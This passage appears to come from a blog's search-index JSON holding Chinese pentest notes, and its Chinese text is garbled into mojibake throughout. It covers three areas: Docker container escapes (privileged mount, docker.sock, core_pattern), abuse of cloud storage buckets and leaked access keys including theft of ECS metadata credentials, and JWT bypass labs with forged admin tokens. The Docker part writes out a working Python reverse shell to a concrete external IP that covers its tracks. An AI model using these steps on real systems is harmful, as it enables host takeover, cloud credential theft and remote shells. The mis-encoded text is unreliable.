æ‹¿åˆ°ä¸»æœºæƒé™","tags":["docker"]},{"title":"Docker-é€ƒé€¸-å®‰å…¨","path":"/2025/08/18/posts/docker/","content":"Docker-é€ƒé€¸-å®‰å…¨-æŒ‚è½½-ç‰¹æƒ å¦‚ä½•åˆ¤æ–­åœ¨ä¸åœ¨dockerç¯å¢ƒå®¹å™¨é€ƒé€¸æ–¹æ³•æ£€æµ‹æŒ‡åŒ— | T Wiki 1.cat /proc/1/cgroup | grep -qi docker echo Is Docker || echo Not Docker2.æ£€æŸ¥/.dockerenvæ–‡ä»¶3.æ£€æŸ¥mountä¿¡æ¯4.æŸ¥çœ‹ç¡¬ç›˜ fdisk -lå¦‚æœæµ‹è¯•äº†ç‰¹æƒä¸è¡Œï¼Œsocket,æŒ‚è½½éƒ½æ²¡æœ‰ï¼Œå°±æµ‹è¯•dockeræ¼æ´ï¼Œå†…æ ¸æ¼æ´ï¼Œç¿»æ•°æ®åº“æ–‡ä»¶æ‰¾å’Œä¸»ç›®å½•æœ‰äº¤é›†çš„æ–‡ä»¶å¦‚æœæ˜¯JAVAåº”ç”¨ä½ è¿›å»å°±æ˜¯ROOT å°±è€ƒè™‘é€ƒé€¸å¦‚æœæ˜¯WWWé‚£ä¹ˆè¿˜è¦åŠ ä¸€æ­¥ææƒåˆ°ROOT å†åˆ°é€ƒé€¸ç›®å½•æŒ‚è½½å¦‚æœæœ‰etcå•Šlogå°±ä¸ç¡®å®šèƒ½ä¸èƒ½è·å¾—å…³é”®ä¿¡æ¯äº† ç‰¹æƒæ¨¡å¼é€ƒé€¸docker run --rm --privileged=true -it alpine å¯åŠ¨äº¤äº’ç»ˆç«¯ åå­—å«alpine åœæ­¢å°±åˆ é™¤ å¹¶ä¸” æœ‰ç‰¹æƒæ¨¡å¼çš„dockeré•œåƒ æ‹¿å»åè¿›å…¥ä¸€ä¸ªç»ˆç«¯å¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹å°±æœ‰dockerç‰¹å¾â€”ç¡®å®šåœ¨dockeré‡Œé¢äº† åˆ¤æ–­æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼cat /proc/self/status | grep CapEff å¦‚æœåœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œä»è€Œåˆ¤æ–­å®¹å™¨æ˜¯ä¸æ˜¯ç‰¹æƒæ¨¡å¼ï¼Œå¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff ç‰¹æƒæ¨¡å¼æŒ‚è½½é€ƒé€¸ç‰¹æƒæ¨¡å¼æŸ¥çœ‹ç£ç›˜ä¿¡æ¯ ç°åœ¨æˆ‘ä»¬çš„testé‡Œé¢å°±æ˜¯æ ¹ç›®å½•ä¿¡æ¯ fdisk -lmkdir /test mount /dev/sda1 /testæŒ‚è½½äº† çœŸæœºçš„ç‰©ç†åˆ†åŒº /dev/sda1 åˆ°å®¹å™¨å†…çš„ /test ç›®å½•ï¼Œå®ç°äº†å®¹å™¨ä¸çœŸæœºä¹‹é—´çš„ æ–‡ä»¶ç³»ç»Ÿå…±äº«å¾€testé‡Œé¢å¯¹åº”å°±æ˜¯æ ¹ç›®å½•å†™å…¥çš„æ–‡ä»¶å¯¹åº”æ˜¾ç¤ºçœŸæœºç›®å½• ä¸‹ä¸€æ­¥å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹SHELL Docker Socket é€ƒé€¸docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntuæ¢æµ‹å­˜ä¸å­˜åœ¨sockls -lah /var/run/docker.sock å¦‚æœå­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œè¯´æ˜æ¼æ´å¯èƒ½å­˜åœ¨å®¹å™¨å†…éƒ¨å®‰dockerå®¢æˆ·ç«¯docker exec -it with_docker_sock /bin/bashapt-get updateapt-get install curlcurl -fsSL https://get.docker.com/ | shå®‰è£…å¤±è´¥å°±æ‰‹åŠ¨å®‰è£…apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin docker-ce-rootless-extras docker-buildx-pluginæ‰§è¡Œdockerå‘½ä»¤é€ƒé€¸docker run -it -v /:/host ubuntu /bin/bash -v /:/hostï¼šå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•ï¼ˆ/ï¼‰æŒ‚è½½åˆ°å®¹å™¨å†…çš„ /host ç›®å½•å¯¹ /host çš„æ“ä½œä¼šç›´æ¥å½±å“å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿchroot /host æ”¹å˜æ ¹ç›®å½• ä¸æ˜¯ç‰¹æƒä½†æ˜¯åœ¨dockerç¯å¢ƒå¹¶ä¸”å‘ç°sockæ–‡ä»¶ æŒ‚è½½æˆåŠŸé€ƒé€¸æˆåŠŸ docker-procfsé€ƒé€¸docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu å¯åŠ¨dockerfind / -name core_pattern æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´ å¦‚æœæœ‰ä¸¤ä¸ªå°±è¡¨ç¤ºæœ‰cat /proc/mounts | xargs -d , -n 1 | grep workdir æ£€æŸ¥å·¥ä½œç›®å½•ç»å¯¹è·¯å¾„å®‰è£…gcc apt-get update -y apt-get install gcc -y æ‰¾åˆ°å·¥ä½œç›®å½• workdirvarlibdockeroverlay261934ad893e443d362bd64e7d78111896fefcfaaed6b550f0a185d9745465676work 0 0 cat /tmp/.x.py EOF#!/usr/bin/pythonimport osimport ptyimport socketlhost = 116.62.32.64 lport = 5566def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(HISTFILE, /dev/null) pty.spawn(/bin/bash) os.remove(/tmp/.x.py) s.close()if __name__ == __main__: main()EOFè®¾ç½®å¥½åå¼¹çš„IPä»¥åŠç«¯å£chmod 777 .x.py ç»™æƒé™ echo -e |/var/lib/docker/overlay2/61934ad893e443d362bd64e7d78111896fefcfaaed6b550f0a185d9745465676/merged/tmp/.x.py \\rcore /host/proc/sys/kernel/core_pattern è®¾ç½®å¥½æŒ‚è½½è·¯å¾„ä¸å·¥ä½œè·¯å¾„å¯¹åº” cat /tmp/x.c EOF#include stdio.hint main(void) int *a = NULL; *a = 1; return 0;EOFgcc x.c -o x ç¼–è¯‘æ‰§è¡Œæ–‡ä»¶ï¼š./x nc -lvvp xxxx åå¼¹æˆåŠŸ","tags":["docker"]},{"title":"äº‘ä¸ŠæœåŠ¡-OSSå­˜å‚¨æ¡¶æ¸—é€-AKSKä¸¤ç§åˆ©ç”¨ç‰¹å¾","path":"/2025/08/14/posts/oss/","content":"äº‘ä¸ŠæœåŠ¡-OSSå­˜å‚¨æ¡¶æ¸—é€-AKSKä¸¤ç§åˆ©ç”¨ç‰¹å¾-ECSå…ƒæ•°æ®æ¨ªå‘ç§»åŠ¨ OSSOSSä»‹ç»ç‰¹åˆ«æç¤ºè®¿é—®é˜¿é‡Œäº‘ä¸è¦å¼€å¯æŠ“åŒ…å¯èƒ½ä¼šå°å· å„ä¸ªäº‘å‚å•†å¯¹äº‘æœåŠ¡çš„å«æ³•éƒ½ä¸ç»Ÿä¸€ï¼Œè¿™é‡Œç»Ÿä¸€ä»¥AWSä¸ºä¾‹ã€‚ S3 å¯¹è±¡å­˜å‚¨Simple Storage Serviceï¼Œ ç®€å•çš„è¯´å°±æ˜¯ä¸€ä¸ªç±»ä¼¼ç½‘ç›˜çš„ä¸œè¥¿ EC2 å³å¼¹æ€§è®¡ç®—æœåŠ¡Elastic Compute Cloudï¼Œ ç®€å•çš„è¯´å°±æ˜¯åœ¨äº‘ä¸Šçš„ä¸€å°è™šæ‹Ÿæœºã€‚ RDS äº‘æ•°æ®åº“Relational Database Serviceï¼Œ ç®€å•çš„è¯´å°±æ˜¯äº‘ä¸Šçš„ä¸€ä¸ªæ•°æ®åº“ã€‚ IAM èº«ä»½å’Œè®¿é—®ç®¡ç†Identity and Access Managementï¼Œ ç®€å•çš„è¯´å°±æ˜¯äº‘æ§åˆ¶å°ä¸Šçš„ä¸€å¥—èº«ä»½ç®¡ç†æœåŠ¡ï¼Œå¯ä»¥ç”¨æ¥ç®¡ç†æ¯ä¸ªå­è´¦å·çš„æƒé™ ä¸åŒå‚å•†å¯¹è±¡å­˜å‚¨åå­—ä¸åŒ #å¯¹è±¡å­˜å‚¨å„å¤§äº‘åè¯ï¼š é˜¿é‡Œäº‘ï¼šOSS è…¾è®¯äº‘ï¼šCOS åä¸ºäº‘ï¼šOBS è°·æ­Œäº‘ï¼šGCS å¾®è½¯äº‘ï¼šBlob äºšé©¬é€Šäº‘ï¼šS3 è€Œä¸”OSSå¯ä»¥ åˆ›å»ºOSSæ¡¶è´­ä¹°æœåŠ¡ååˆ›å»ºåå­—æ³¨æ„å¿…é¡»å”¯ä¸€ å¯ä»¥çœ‹åˆ°è‡ªåŠ¨æˆ‘ä»¬åŸŸåå˜æˆäº†è¿™ä¸ª æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è¿˜è®¿é—®ä¸åˆ°éœ€è¦ä¸´æ—¶å‡­è¯ è¿™æ—¶å€™æˆ‘ä»¬ä¿®æ”¹ACLç­–ç•¥ å…ˆå…³é—­è¿™ä¸ª å…¬å¼€è¯»å–-éœ€è¦æ–‡ä»¶åä¿®æ”¹è¯»å†™ä¸ºå…¬å¼€è¯»å– åŸæ¥ä¸ä¿®æ”¹çš„è¯ä½ è®¿é—®æ˜¯ä¸ä¼šä¸‹è½½çš„ ameti14.oss-cn-beijing.aliyuncs.com44.jpg ä¿®æ”¹åæ— éœ€å‡­è¯å³å¯ä¸‹è½½ å…¬å¼€ä¸Šä¼ -ä»»æ„ä¸Šä¼ å¦‚æœä½ çš„æƒé™æ˜¯å¼€å¯äº†å…¬å…±è¯»å†™-é‚£ä¹ˆå°±å¯ä»¥å‘åŒ…ä¸Šä¼ äº† å¯ä»¥çœ‹åˆ°200äº† æ–‡ä»¶åˆ—è¡¨å¤šå‡ºäº†æ–‡ä»¶ æˆ–è€…å¼€å¯ç­–ç•¥ossPutObject æˆåŠŸä¸Šä¼ ! . OSS-ç›®å½•éå†æ¡ä»¶æ˜¯ 1ã€å…¬å…±è¯»å–-ç§æœ‰ä¹Ÿå¯ä»¥ 2ã€Policy(listObject) -æƒé™Bucketæˆæƒç­–ç•¥ï¼šè®¾ç½®ListObjectæ˜¾ç¤ºå®Œæ•´ç»“æ„ OSSFileBrowse-1.0-SNAPSHOT-å·¥å…·æŸ¥çœ‹å†…å®¹ è®¾ç½®æƒé™æ˜¯list å½“ä½ å†æ¬¡è®¿é—®åŸºæœ¬çš„åŸŸåå³å¯éå†OSSå…¨éƒ¨å†…å®¹-ä¸ç”¨åŠ æ–‡ä»¶å https://ameti14.oss-cn-beijing.aliyuncs.com/ å·¥å…·å¯ä»¥è®¿é—®æµ‹è¯•å¹¶ä¸”å¯ä»¥æµ‹è¯•ä¸Šä¼  ä»…é™ç®€å•æ¼æ´æµ‹è¯• å·¥å…·æµ‹è¯•æŸ¥çœ‹æœ‰æ— æ•æ„Ÿæ³„éœ²å†…å®¹ OSS-ä»»æ„ä¿®æ”¹ç­–ç•¥https://wiki.teamssix.com/CloudService/S3/bucket-policy-able-to-write.html è®¾ç½®äº†è¿™ä¸ªç­–ç•¥å¹¶ä¸”æˆæƒå…¨éƒ¨è´¦å·åæ”»å‡»è€…å¯ä»¥ä»»æ„ä¿®æ”¹ä½ çš„ç­–ç•¥æ¥å®ç°è®¿é—® å°±æ˜¯ä¿®æ”¹ä¸‹é¢è¿™ä¸ªè¯­æ³• OSS-åŸŸåæ¥ç®¡åŸç†å¦‚ä¸‹ï¼šæ¯”å¦‚ä½ çš„ç½‘ç«™ameti14.oss-cn-beijing.aliyuncs.com/ - ç»‘å®šåŸŸå ti14cham.sec.cloud ä¸Šå»ç„¶åä½ æ²¡ç”¨äº†ä½ æŠŠè¿™ä¸ªameti14.oss-cn-beijing.aliyuncs.comæ¡¶åˆ é™¤äº†X ä½†æ˜¯æ³¨æ„ä½ çš„åŸŸåè¿˜åœ¨å’Œä½ çš„æ¡¶ç»‘å®šè€Œä½ çš„æ¡¶å› ä¸ºé‡Šæ”¾äº†åˆ«äººå°±å¯ä»¥åˆ›å»ºåŒä¸€åœ°åŒºï¼ŒåŒä¸€åå­—å®ç°æ¥ç®¡åŸŸå å½“ä½ è®¿é—®é‚£ä¸ªåŸŸååä¼šæ³„éœ²æœ¬èº«çš„å¦‚alixxåœ°å€æ‰€ä»¥ä½ çŸ¥é“å¯ä»¥åœ°åŒºåŸŸåæ¥ç®¡ AKSKæ³„éœ²æ¥ç®¡AKSKä¸åŒå‚å•†ç‰¹å¾ æ€ä¹ˆå¾—åˆ°AKSKï¼š1ï¼šJSæ³„éœ²2ï¼šAPPåç¼–è¯‘æ³„éœ²3ï¼šæ‹¿åˆ°shelläº†ç¿»æ–‡ä»¶4ï¼šæºç æ³„éœ²Ak/SKç‰¹å¾è¯†åˆ«ï¼šäºšé©¬é€Šäº‘ (Amazon Web Services, AWS)çš„å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯AKIAGoogleäº‘ Cloud Platform (GCP)çš„ å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ GOOGMicrosoft Azure çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ AZIBM äº‘ (IBM Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ IBMOracleäº‘ (Oracle Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ OCIDè…¾è®¯äº‘ (Tencent Cloud)çš„Access Keyå¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ AKIDé˜¿é‡Œäº‘ (Alibaba Cloud)çš„Access Keyå¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ LTAIåä¸ºäº‘ (Huawei Cloud)çš„ Access Keyæ˜¯20ä¸ªéšæœºå¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆç™¾åº¦äº‘ (Baidu Cloud) çš„ Access Keyå¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ AKäº¬ä¸œäº‘ (JD Cloud)çš„Access Keyå¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ JDC_è”é€šäº‘ (China Unicom Cloud)çš„Access Keyå¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ LTCç§»åŠ¨äº‘ (China Mobile Cloud)çš„Access Keyå¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ YDä¸­å›½ç”µä¿¡äº‘ (China Telecom Cloud)çš„å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ CTCå‚è€ƒï¼šhttps://wiki.teamssix.com/CloudService/more/ Ramç”¨æˆ·æƒé™-AKSKRAMè´¦å·å°±æ˜¯åˆ†é…ç”¨æˆ·ç»™ä»–ä»¬ç”¨æˆ·å¯ä»¥ç”¨è¿™ä¸ªæ¥ç™»å½•é˜¿é‡Œäº‘ï¼Œè€Œè¿™ä¸ªç”¨æˆ·æœ‰ç›¸åº”çš„AKå’ŒSKï¼Œä¸åŒç”¨æˆ·æƒé™ç”±ç”¨æˆ·åˆ†é…é€šè¿‡RAMæ§åˆ¶å°åˆ›å»ºç”¨æˆ·ä¼šç”Ÿæˆå¯¹åº”çš„AKSK ç”Ÿæˆåè®°å¾—å¤åˆ¶ä¸ç„¶çœ‹ä¸äº† è¿™é‡Œè´¦å·å¯†ç å¯ä»¥ç”¨æˆ·ramç™»å½• AKSKç”¨æˆ·è°ƒç”¨https://signin.aliyun.com RAMç”¨æˆ·ç™»å½•ç½‘å€ä½¿ç”¨å·¥å…·äº‘èµ„äº§ç®¡ç†å·¥å…·å›¾å½¢åŒ–ç•Œé¢https://github.com/wgpsec/lchttps://github.com/wgpsec/cloudswordhttps://github.com/dark-kingA/cloudToolshttps://github.com/iiiusky/alicloud-toolsè¿™é‡Œæˆ‘ä»¬è¾“å…¥AKSKä½†æ˜¯è¿˜æ˜¯ä¸è¡Œå› ä¸ºç”¨æˆ·ä¹Ÿæ˜¯æœ‰æˆæƒçš„ å½“ä½ ç»™äº†è¿™äº›å…¨éƒ¨æƒé™å æˆåŠŸè¯†åˆ«å½“å‰è´¦å·çš„ECS ä½ å¯ä»¥ç‚¹å‡»æ¥ç®¡ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªRAMç”¨æˆ·è¿›è¡Œç‚¹å‡»RAMç™»å½•ä¸Šå»è´¦æˆ· æ‰€ä»¥AKSKæ˜¯è¦çœ‹è¿æ°”çš„çœ‹æƒé™çš„ä¸ç„¶ä¹Ÿæ²¡å•¥ç”¨ æ ¹æ®AKSKæƒé™åŒºåˆ†æ§åˆ¶OSSæˆ–è€…è´¦å·å…¨éƒ¨èµ„äº§ ä¸‹é¢æ˜¯å®˜æ–¹å·¥å…·éœ€è¦AKSKç™»å½• äº‘è´¦æˆ·ä¸‹é¢çš„AKSKå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç”¨æˆ·ä¸‹é¢æœ¬æ¥å°±æœ‰AKSKäº‘è´¦å·çš„AKSKé»˜è®¤å°±æ˜¯ç»‘å®šäº‘è´¦æˆ·ï¼Œäº‘è´¦å·ä»€ä¹ˆæƒé™ä»–å°±æ˜¯ä»€ä¹ˆæƒé™ä¸éœ€è¦é¢å¤–è®¾ç½® ä¸€ç§ramæ˜¯ä¸‹é¢åˆ†æ”¯è€Œäº‘è´¦å·çš„AKSKæ˜¯ä»–çš„è½½ä½“ ç”Ÿæˆåå®ƒä¸éœ€è¦è®¾ç½®ä»€ä¹ˆæƒé™-åªè¦ä½ è´¦æˆ·æœ‰OSSä»–å°±å¯ä»¥çœ‹æœ‰ECSä»–å°±å¯ä»¥çœ‹ï¼Œå¹¶ä¸”å¯ä»¥ç”ŸæˆRAMç”¨æˆ· ECS-å…ƒæ•°æ®å…ƒæ•°æ®å®ä¾‹å…ƒæ•°æ®æ˜¯æŒ‡å®ä¾‹IDã€VPCä¿¡æ¯ã€ç½‘å¡ä¿¡æ¯ç­‰å®ä¾‹å±æ€§ä¿¡æ¯ï¼Œæ”¯æŒåœ¨ECSå®ä¾‹å†…éƒ¨é€šè¿‡è®¿é—®å…ƒæ•°æ®æœåŠ¡ï¼ˆMetadata Serviceï¼‰è·å–ã€‚é€šè¿‡è¯¥è·å–æ–¹å¼ï¼Œæ‚¨æ— éœ€ç™»å½•æ§åˆ¶å°æˆ–è°ƒç”¨APIï¼Œåœ¨å®ä¾‹å†…éƒ¨å³å¯è®¿é—®å®ä¾‹ä¿¡æ¯ï¼Œå¯ä»¥æ›´ä¾¿æ·ã€å®‰å…¨åœ°é…ç½®æˆ–ç®¡ç†æ­£åœ¨è¿è¡Œçš„å®ä¾‹æˆ–å®ä¾‹ä¸Šçš„ç¨‹åºã€‚ é˜¿é‡Œäº‘å…ƒæ•°æ®åœ°å€ï¼šhttp://100.100.100.200/è…¾è®¯äº‘å…ƒæ•°æ®åœ°å€ï¼šhttp://metadata.tencentyun.com/åä¸ºäº‘å…ƒæ•°æ®åœ°å€ï¼šhttp://169.254.169.254/äºšé©¬äº‘å…ƒæ•°æ®åœ°å€ï¼šhttp://169.254.169.254/å¾®è½¯äº‘å…ƒæ•°æ®åœ°å€ï¼šhttp://169.254.169.254/è°·æ­Œäº‘å…ƒæ•°æ®åœ°å€ï¼šhttp://metadata.google.internal/ 1ã€å‰ææ¡ä»¶ï¼š-å¼¹æ€§è®¡ç®—é…ç½®è®¿é—®æ§åˆ¶è§’è‰²-SSRFæ¼æ´æˆ–å·²å–å¾—æŸäº‘æœåŠ¡å™¨æƒé™ï¼ˆwebshellæˆ–æ¼æ´rceå¯ä»¥è®¿é—®è§¦å‘URLï¼‰RAMç”¨æˆ·ä¸åŒï¼ŒRAMè§’è‰²æ²¡æœ‰æ°¸ä¹…èº«ä»½å‡­è¯ï¼ˆç™»å½•å¯†ç æˆ–è®¿é—®å¯†é’¥ï¼‰ï¼Œéœ€è¦è¢«ä¸€ä¸ªå¯ä¿¡å®ä½“æ‰®æ¼” åˆ†é…è§’è‰²åˆ°ECSä¸Šé¢è·å–å…³é”®ä¿¡æ¯http://100.100.100.200/latest/meta-data/http://100.100.100.200/latest/meta-data/ram/security-credentials/ è·å¾—ç”¨æˆ·è·å–ä¸´æ—¶å‡­è¯http://100.100.100.200/latest/meta-data/ram/security-credentials/xxxxxx è®¿é—®åè·å¾—AKSKä»¥åŠTOKENç„¶åä½¿ç”¨äº‘ç®¡ç†å·¥å…·è¿æ¥åˆ©ç”¨æ¡ä»¶ï¼šSSRFï¼Œæˆ–è€…å¾—åˆ°SHELLæ‰€ä»¥æ¡ä»¶ä¸‹:æ¨ªå‘ç§»åŠ¨1ï¼šä½ æ‹¿åˆ°æƒé™é‡Œé¢æ˜¯ROOTä½ å¯ä»¥ç›´æ¥è®¿é—®å¯¹åº”æœ‰æ²¡æœ‰ç”¨æˆ·è·å¾—AKSKå¦‚æœå¯¹æ–¹AKSKæƒé™å¤§è¿›è€Œæ‰©å¤§æˆ˜æœ2ï¼šå¯ä»¥åˆ©ç”¨SSRFè·å¾—AKSK åŸºç¡€åˆ©ç”¨æˆäºˆè§’è‰² è®¿é—®å¯¹åº”çš„å…ƒæ•°æ®è·å¾—ç”¨æˆ·ç„¶åè®¿é—®ç”¨æˆ·å¾—åˆ°AKSKæ”¾å…¥åˆ©ç”¨å·¥å…·åˆ©ç”¨ ä¸€æ—¦æ”¶å›å°±æ˜¾ç¤º404äº†","tags":["oss","aksk"]},{"title":"JWTæ¸—é€ç›¸å…³","path":"/2025/08/13/posts/JWT/","content":"JWTæ¸—é€ç›¸å…³ ä»‹ç»JSON Web Token(JWT)ã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•ã€‚è¿™ä½¿å¾—JWTæˆä¸ºé«˜åº¦åˆ†å¸ƒå¼ç½‘ç«™çš„çƒ­é—¨é€‰æ‹©ï¼Œåœ¨è¿™äº›ç½‘ç«™ä¸­ï¼Œç”¨æˆ·éœ€è¦ä¸å¤šä¸ªåç«¯æœåŠ¡å™¨æ— ç¼äº¤äº’ã€‚ åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ Header-payload-Signature(ç­¾å) å·¥ä½œæµç¨‹ï¼špostæäº¤è¡¨å•åï¼Œåç«¯éªŒè¯å®Œæˆç”Ÿæˆä¸€ä¸ªjwtï¼Œæ¥ä¸‹æ¥è¿”å›è¯¥jwtè‡³å®¢æˆ·ç«¯ï¼Œéšåè¯·æ±‚ä¸­å¸¦ä¸Šè¯¥jwtï¼Œå³å¯å·¥ä½œã€‚ 5ã€ä½œä¸ºè¯·æ±‚å¤´å¯ä»¥è·¨åŸŸå·¥ä½œ å¯¹æ¯”cookie-session1ã€JWTæ•°æ®é‡å°ï¼Œä¼ è¾“é€Ÿåº¦å¿«2ã€ç”±äºæ˜¯jsonï¼ŒJWTæ˜¯è·¨è¯­è¨€çš„ï¼Œåº”ç”¨å¹¿3ã€æ›´é€‚ç”¨äºç§»åŠ¨ç«¯ï¼Œå› ä¸ºå®ƒä»¬ä¸æ”¯æŒcookie4ã€é¿å…csrfï¼Œå› ä¸ºä¸ä¾èµ–cookieå¤´ï¼š alg: HS256,\t#ç­¾åç®—æ³• HMAC SHA256 typ: JWT #ç»Ÿä¸€ä¸ºJWTpayload sub: 1234567890, name: Helen, admin: trueSignatureï¼ˆéªŒè¯ï¼‰ å®éªŒ1-ä¸éªŒè¯ç­¾åLab: JWT authentication bypass via unverified signature ä¸ä¼šéªŒè¯ç­¾åhttps://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature å®ç°ä¿®æ”¹ç”¨æˆ·ä¸ºadmin åœ¨ä½ ç™»å½•ä¸Šå»åäº§ç”ŸJWTé‡Œé¢å¯¹åº”äº†ä½ çš„ç”¨æˆ·åä¿¡æ¯ æ”¾å…¥åˆ°å·¥å…·æ‰«æå¯ä»¥å¾—åˆ° ä¸ºäº†æˆ‘ä»¬ä¿®æ”¹å¯ä»¥ä½¿ç”¨JWTTOOL -T ä¿®æ”¹ æˆ–è€…ä½¿ç”¨BPæ’ä»¶ä¿®æ”¹ çœ‹çœ‹ç”Ÿæˆçš„ç”¨æˆ·ä¿®æ”¹æ²¡ æˆ‘ä»¬è®¿é—®adminé‡æ–°å‘åŒ… eyJraWQiOiJkOTE3NDA3My1lMTcwLTQ4NDctOTAwMC04ZTcxMzY1Yjg1YmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NTA1NjQzMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.pQxVLaYatgGTpT24U6fh5Le3WacEkOP5_x2KW-Rg6_sVClGmUfgq1CXxHfUjQyjSGnJBIuiSoAdBS7u0m9MMdgcEz-NNPtc6CPUOcDZ2_coG9IlMFRd1sC6QOvgBTglRC4vzVMySrixSEWGDyr9cXGFGR3WhFb38dtCRHKxSTPDTC33QeqvfCtYWDqkPoYzEJ4766II_3tEYB3sMHWlveWKPuiBq7P9jg-N2y3aaToNsM_rSg8733ev8BJtkoJzoPmXlE6dhoNvdwKALYZ0Gpa1r-TbjAY0cdREhjoSuhZWjp_RXok9ddex4DDZDZwjRoh-JebOvzIng_tIgIAbDbA æˆåŠŸè¿›å…¥ç®¡ç†å‘˜ç•Œé¢åˆ é™¤ç”¨æˆ·å³å¯é€šè¿‡ åˆ é™¤ä¹Ÿè¦è¦†ç›–JWTè¿›è¡Œç»•è¿‡å› ä¸ºä»–å¹¶æ²¡æœ‰éªŒè¯ç­¾å å®éªŒ2 å¯¹æ–¹éªŒè¯ä¸è¦ç­¾åçš„JWTJWT authentication bypass via flawed signature verificationhttps://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification ç›®çš„ä¹Ÿæ˜¯åˆ é™¤ç”¨æˆ·ç™»å½•adminç½‘é¡µ è¿™ä¸ªè®¾ç½®ç¼ºé™·æ˜¯å¯¹æ–¹æ¥æ”¶æœªç­¾åçš„JWTå°±æ˜¯algä¸ºnone è¿™é‡Œ-H å¯ä»¥çœ‹åˆ°å¯ä»¥è¾“å…¥ -X a ç›´æ¥è®©JWTç­¾åä¸ºç©ºä¸ç”¨æ‰‹åŠ¨è¾“å…¥äº† æˆ‘ä»¬æ¥å‘åŒ…éªŒè¯ å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›å…¥ eyJraWQiOiJmZWIyMjFkOS00MWI0LTQwNGEtOGUyZi1lNjU4Mzk5YjM0MDAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NTA1NzgxNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9. å®éªŒ3 ç­¾åå¼±å£ä»¤JWT authentication bypass via weak signing keyhttps://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key ç­¾åä¹Ÿæ˜¯å¯ä»¥çˆ†ç ´çš„ï¼Œå¦‚æœä½ çˆ†ç ´å‡ºç­¾åå°±å¯ä»¥éšæ„åˆ©ç”¨å‰ææ˜¯ä»–çš„åŠ å¯†ç®—æ³•ç¬¦åˆ ä½¿ç”¨DudeSuite å·¥å…·çˆ†ç ´ä¹Ÿå¯ä»¥ä½¿ç”¨john hashcat æ³¨æ„çˆ†ç ´è¦è¾“å…¥å®Œæ•´çš„JWT è¾“å…¥æ•´ä¸ª JWT å¯ä»¥ç¡®ä¿çˆ†ç ´è¿‡ç¨‹çš„å®Œæ•´æ€§å’Œå‡†ç¡®æ€§ã€‚æœ‰äº›æƒ…å†µä¸‹ï¼ŒJWT çš„è´Ÿè½½ä¸­å¯èƒ½åŒ…å«ä¸€äº›ä¸éªŒè¯é€»è¾‘ç›¸å…³çš„ä¿¡æ¯ï¼ˆæ¯”å¦‚è¿‡æœŸæ—¶é—´ã€ç”¨æˆ·è§’è‰²ç­‰ï¼‰ï¼Œè™½ç„¶è¿™äº›ä¿¡æ¯ä¸æ˜¯ç›´æ¥å‚ä¸ç­¾åè®¡ç®—ï¼Œä½†åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œå®ƒä»¬ä¼šå½±å“åˆ°ç­¾åéªŒè¯çš„æœ€ç»ˆç»“æœã€‚é€šè¿‡ä½¿ç”¨å®Œæ•´çš„ 